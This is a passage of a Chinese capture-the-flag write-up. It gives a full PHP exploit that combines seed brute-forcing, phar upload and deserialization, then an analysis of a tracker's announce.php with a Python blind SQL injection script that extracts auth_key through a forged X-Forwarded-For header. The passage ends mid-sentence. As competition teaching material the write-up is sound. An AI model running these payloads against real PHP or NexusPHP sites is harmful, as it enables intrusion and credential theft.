<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generateRandomString</span>(<span class="params"><span class="variable">$length</span> = <span class="number">8</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$characters</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span>;</span><br><span class="line">    <span class="variable">$randomString</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$r</span> = <span class="title function_ invoke__">rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$characters</span>) - <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$randomString</span> .= <span class="variable">$characters</span>[<span class="variable">$r</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$randomString</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Hi&#x27;</span>);</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$GLOBALS</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="variable">$seed</span> = <span class="variable">$time</span> . <span class="title function_ invoke__">intval</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="variable">$seed</span>); </span><br><span class="line"><span class="variable">$randomStr</span> = <span class="title function_ invoke__">generateRandomString</span>(<span class="number">8</span>);</span><br><span class="line"><span class="variable">$newFilename</span> = <span class="variable">$time</span> . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$randomStr</span> . <span class="string">&#x27;.&#x27;</span> . <span class="string">&#x27;jpg&#x27;</span>; </span><br></pre></td></tr></table></figure>

<p>本地测试一下知道$time在一分钟内值是不会变的，filename又是我们可控，相当于任意一分钟内$seed也是我们可控的。那么我们只需要选定一个时间，提前爆破好能使$randomStr以phar开头的$filename即可。</p>
<p>完整exp如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generateRandomString</span>(<span class="params"><span class="variable">$length</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$characters</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span>;</span><br><span class="line">    <span class="variable">$randomString</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    **<span class="keyword">for</span>** (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$r</span> = <span class="title function_ invoke__">rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$characters</span>) - <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$randomString</span> .= <span class="variable">$characters</span>[<span class="variable">$r</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$randomString</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">date_default_timezone_set</span>(<span class="string">&#x27;Asia/Shanghai&#x27;</span>);</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Hi&#x27;</span>); <span class="comment">//date在一段时间内固定，及时发包即可</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//爆破filename控制最终文件名</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$filename</span> = <span class="number">1</span>; <span class="variable">$filename</span> &lt;= <span class="number">999999999999999999</span>; <span class="variable">$filename</span>++) &#123;</span><br><span class="line">    <span class="variable">$seed</span> = <span class="variable">$time</span> . <span class="title function_ invoke__">intval</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="title function_ invoke__">srand</span>(<span class="variable">$seed</span>);</span><br><span class="line">    <span class="variable">$randomStr</span> = <span class="title function_ invoke__">generateRandomString</span>(<span class="number">8</span>);</span><br><span class="line">    <span class="variable">$newFilename</span> = <span class="variable">$time</span> . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$randomStr</span> . <span class="string">&#x27;.&#x27;</span> . <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    **<span class="keyword">echo</span>** <span class="variable">$time</span> . <span class="string">&quot;---&quot;</span> . <span class="variable">$seed</span> . <span class="string">&quot;---&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;---&quot;</span> . <span class="variable">$newFilename</span> . <span class="string">&quot;\n\n\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$randomStr</span>, <span class="string">&#x27;phar&#x27;</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Found &#x27;phar&#x27; in filename! Stopping.\n&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$readflag</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)//构造方法置空防止反序列化问题</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//触发构造方法上传文件</span></span><br><span class="line"><span class="variable">$o1</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$o1</span>-&gt;f = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line"><span class="variable">$o1</span>-&gt;key = <span class="string">&#x27;class&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span><span class="string">&quot;---------------&quot;</span>. <span class="variable">$filename</span> . <span class="string">&quot;------------&quot;</span>;</span><br><span class="line"><span class="variable">$o1</span>-&gt;readflag = <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//触发匿名类函数加载内部方法</span></span><br><span class="line"><span class="variable">$o2</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$o2</span>-&gt;f = [<span class="string">&quot;class@anonymous\0/var/www/html/index.php(1) : eval()&#x27;d code:1<span class="subst">$0</span>&quot;</span>, <span class="string">&#x27;readflag&#x27;</span>];</span><br><span class="line"><span class="variable">$o2</span>-&gt;key = <span class="string">&#x27;func&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//触发内部方法文件包含</span></span><br><span class="line"><span class="variable">$o3</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$o3</span>-&gt;f = <span class="string">&#x27;readflag&#x27;</span>;</span><br><span class="line"><span class="variable">$o3</span>-&gt;key = <span class="string">&#x27;func&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$arr</span> = [<span class="variable">$o1</span>, <span class="variable">$o2</span>, <span class="variable">$o3</span>];</span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$ser</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sendrequest</span>(<span class="params"><span class="variable">$url</span>, <span class="variable">$payload</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//上传构造好的恶意gzip</span></span><br><span class="line">    <span class="variable">$postData</span> = [</span><br><span class="line">        <span class="string">&#x27;file&#x27;</span> =&gt; <span class="keyword">new</span> <span class="title class_">CURLFile</span>(<span class="string">&#x27;./phpinfo.phar.gz&#x27;</span>, <span class="string">&#x27;application/gzip&#x27;</span>, <span class="string">&#x27;file.txt&#x27;</span>)</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">curl_setopt_array</span>(<span class="variable">$ch</span>, [</span><br><span class="line">        CURLOPT_URL =&gt; <span class="variable">$url</span> . <span class="string">&#x27;?land=&#x27;</span> . <span class="variable">$payload</span>,</span><br><span class="line">        CURLOPT_POST =&gt; **<span class="literal">true</span>**,</span><br><span class="line">        CURLOPT_POSTFIELDS =&gt; <span class="variable">$postData</span>,</span><br><span class="line">        CURLOPT_RETURNTRANSFER =&gt; **<span class="literal">true</span>**,</span><br><span class="line">        CURLOPT_SSL_VERIFYPEER =&gt; **<span class="literal">false</span>**,</span><br><span class="line">        CURLOPT_TIMEOUT =&gt; <span class="number">30</span>,</span><br><span class="line">    ]);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$response</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="variable">$error</span> = <span class="title function_ invoke__">curl_error</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$error</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;cURL Error: &quot;</span> . <span class="variable">$error</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$response</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">sendrequest</span>(<span class="variable">$url</span>,<span class="title function_ invoke__">urlencode</span>(<span class="variable">$ser</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="PTer"><a href="#PTer" class="headerlink" title="PTer"></a>PTer</h2><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/4Fo5sZdRJP5J0aLemoz2EA">https://mp.weixin.qq.com/s/4Fo5sZdRJP5J0aLemoz2EA</a><br>题目给出了用户qwb和密码，我们可以登录进系统中。</p>
<p>在announce.php中发现一处SQL注入，首先是一些参数检测</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// get string type passkey, info_hash, peer_id, event, ip from client</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">&quot;passkey&quot;</span>,<span class="string">&quot;info_hash&quot;</span>,<span class="string">&quot;peer_id&quot;</span>,<span class="string">&quot;event&quot;</span>) <span class="keyword">as</span> <span class="variable">$x</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="variable">$x</span>]))</span><br><span class="line">        <span class="variable">$GLOBALS</span>[<span class="variable">$x</span>] = <span class="variable">$_GET</span>[<span class="variable">$x</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// get integer type port, downloaded, uploaded, left from client</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">&quot;port&quot;</span>,<span class="string">&quot;downloaded&quot;</span>,<span class="string">&quot;uploaded&quot;</span>,<span class="string">&quot;left&quot;</span>,<span class="string">&quot;compact&quot;</span>,<span class="string">&quot;no_peer_id&quot;</span>) <span class="keyword">as</span> <span class="variable">$x</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$GLOBALS</span>[<span class="variable">$x</span>] = <span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="variable">$x</span>] ?? <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//check info_hash, peer_id and passkey</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">&quot;info_hash&quot;</span>,<span class="string">&quot;peer_id&quot;</span>,<span class="string">&quot;port&quot;</span>,<span class="string">&quot;downloaded&quot;</span>,<span class="string">&quot;uploaded&quot;</span>,<span class="string">&quot;left&quot;</span>) <span class="keyword">as</span> <span class="variable">$x</span>)</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="variable">$x</span>])) <span class="title function_ invoke__">warn</span>(<span class="string">&quot;Missing key: <span class="subst">$x</span>&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">&quot;info_hash&quot;</span>,<span class="string">&quot;peer_id&quot;</span>) <span class="keyword">as</span> <span class="variable">$x</span>)</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$GLOBALS</span>[<span class="variable">$x</span>]) != <span class="number">20</span>) <span class="title function_ invoke__">warn</span>(<span class="string">&quot;Invalid <span class="subst">$x</span> (&quot;</span> . <span class="title function_ invoke__">strlen</span>(<span class="variable">$GLOBALS</span>[<span class="variable">$x</span>]) . <span class="string">&quot; - &quot;</span> . <span class="title function_ invoke__">rawurlencode</span>(<span class="variable">$GLOBALS</span>[<span class="variable">$x</span>]) . <span class="string">&quot;)&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$passkey</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$passkey</span>) != <span class="number">32</span>) <span class="title function_ invoke__">warn</span>(<span class="string">&quot;Invalid passkey (&quot;</span> . <span class="title function_ invoke__">strlen</span>(<span class="variable">$passkey</span>) . <span class="string">&quot; - <span class="subst">$passkey</span>)&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>主要满足：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="string">&quot;passkey&quot;</span>,<span class="string">&quot;info_hash&quot;</span>,<span class="string">&quot;peer_id&quot;</span>,<span class="string">&quot;event&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>和</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="string">&quot;info_hash&quot;</span>,<span class="string">&quot;peer_id&quot;</span>,<span class="string">&quot;port&quot;</span>,<span class="string">&quot;downloaded&quot;</span>,<span class="string">&quot;uploaded&quot;</span>,<span class="string">&quot;left&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>里面的所有参数传入，并且info_hash和passkey必须正确，info_hash是已经在平台上存在的种子hash，在详情页面可以看到，passkey则是用户控制面板的密钥。</p>
<p>漏洞点在413行，明显存在SQL注入</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sameIPRecord</span> = <span class="title function_ invoke__">mysql_fetch_assoc</span>(<span class="title function_ invoke__">sql_query</span>(<span class="string">&quot;select id from peers where torrent = <span class="subst">$torrentid</span> and userid = <span class="subst">$userid</span> and ip = &#x27;<span class="subst">$ip</span>&#x27; limit 1&quot;</span>));</span><br></pre></td></tr></table></figure>

<p>追溯一下获取$ip的地方</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//4. GET IP AND CHECK PORT</span></span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">getip</span>();	<span class="comment">// avoid to get the spoof ip from some agent</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>] = <span class="variable">$ip</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$port</span> || <span class="variable">$port</span> &gt; <span class="number">0xffff</span>)</span><br><span class="line">	<span class="title function_ invoke__">warn</span>(<span class="string">&quot;invalid port&quot;</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getip</span>(<span class="params"><span class="variable">$real</span> = <span class="literal">true</span></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">validip</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">			<span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">		&#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">validip</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>])) &#123;</span><br><span class="line">			<span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>];</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>) &amp;&amp; <span class="title function_ invoke__">validip</span>(<span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>))) &#123;</span><br><span class="line">			<span class="variable">$ip</span> = <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>);</span><br><span class="line">		&#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>) &amp;&amp; <span class="title function_ invoke__">validip</span>(<span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>))) &#123;</span><br><span class="line">			<span class="variable">$ip</span> = <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="variable">$ip</span> = <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;REMOTE_ADDR&#x27;</span>) ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="variable">$ip</span> = <span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$ip</span>), <span class="string">&quot;,&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$real</span> &amp;&amp; <span class="title function_ invoke__">str_contains</span>(<span class="variable">$ip</span>, <span class="string">&quot;,&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">strstr</span>(<span class="variable">$ip</span>, <span class="string">&quot;,&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$ip</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>明显是可以通过XFF伪造的，因此可以构造exp进行注入，要注意的是会判断Host是否包含在$trackerUrl，所以要改一下host，平台上是pter.qwb.local</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$currentUrl</span> = <span class="title function_ invoke__">getSchemeAndHttpHost</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">str_contains</span>(<span class="variable">$trackerUrl</span>, <span class="variable">$currentUrl</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">do_log</span>(<span class="string">&quot;announce check tracker url, trackerUrl: <span class="subst">$trackerUrl</span> does not contains: <span class="subst">$currentUrl</span>&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">warn</span>(<span class="string">&quot;you should announce to: <span class="subst">$trackerUrl</span>&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>盲注获取auth_key</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">passkey = <span class="string">&quot;0ef547977bb67b8fdf34dbba8ac28efa&quot;</span></span><br><span class="line">session = <span class="string">&quot;eyJpdiI6IktZcWF2WktzYmNhaXB3OE56Vzg2MWc9PSIsInZhbHVlIjoiWjZ0N3JSRnN4VGJJVEZHVnk2bnV6MmdlOXhpdXFwWlpaanhzUmJLU0lzMnVHSmsrOWlSNyswVFI1dmtNWWdDWHUydElrRHZkVWluODBlQmNmTGlBMEhGd2hUeXpLdS9ETnFFM3Y5dDBDa29DRVdzaEJFTGlpdHB6ZjlWVlhITUMiLCJtYWMiOiJlYjM4MWU3NTc2MTZiY2Y2NGZkNmQ2ZmYyYjQ0ZjQ3ZWI4NjgxMmU1NWE3NzcyYTBhZTA4ZWQ5ODA2NzZjM2IzIiwidGFnIjoiIn0=&quot;</span></span><br><span class="line">url = <span class="string">&quot;http://xxx/&quot;</span></span><br><span class="line">sess = requests.Session()</span><br><span class="line">sess.cookies.<span class="built_in">set</span>(<span class="string">&quot;c_secure_pass&quot;</span>, session)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">announce</span>(<span class="params">data</span>):</span><br><span class="line">    sleep(<span class="number">5</span>)</span><br><span class="line">    u = url + <span class="string">&quot;announce.php&quot;</span></span><br><span class="line">    payload = <span class="string">f&quot;&#x27; or exp(710-( <span class="subst">&#123;data&#125;</span> )) and &#x27;&quot;</span></span><br><span class="line">    r = sess.post(u, params=&#123;<span class="string">&quot;info_hash&quot;</span>: <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;2cefbfbd6a5f5227efbfbdefbfbd6befbfbd4aef&quot;</span>), <span class="string">&quot;peer_id&quot;</span>: <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;2cefbfbd6a5f5227efbfbdefbfbd6befbfbd4aef&quot;</span>), <span class="string">&quot;port&quot;</span>:<span class="string">&quot;80&quot;</span>, <span class="string">&quot;downloaded&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;uploaded&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;left&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;passkey&quot;</span>: passkey, <span class="string">&quot;event&quot;</span>: <span class="string">&quot;stopped&quot;</span>&#125;, headers=&#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;uTorrent/3000&quot;</span>, <span class="string">&quot;X-FORWARDED-FOR&quot;</span>: payload, <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;pter.qwb.local&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sqli1</span>():</span><br><span class="line">    ans = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>):</span><br><span class="line">        chars = <span class="string">&#x27;1234567890abcdef-&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">            <span class="keyword">if</span> char == <span class="string">&quot;-&quot;</span>:</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line">            payload = <span class="string">f&quot;select length(auth_key) from users where auth_key like &#x27;<span class="subst">&#123;ans&#125;</span><span class="subst">&#123;char&#125;</span>%&#x27; and id=1 union select 0 limit 1&quot;</span></span><br><span class="line">            <span class="keyword">if</span> announce(payload):</span><br><span class="line">                ans += char</span><br><span class="line">                <span class="built_in">print</span>(ans)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">sqli1()</span><br></pre></td></tr></table></figure>

<p>app&#x2F;Auth&#x2F;NexusWebUserProvider.php-&gt;validateCredentials中有如下验证cookie代码：</p>
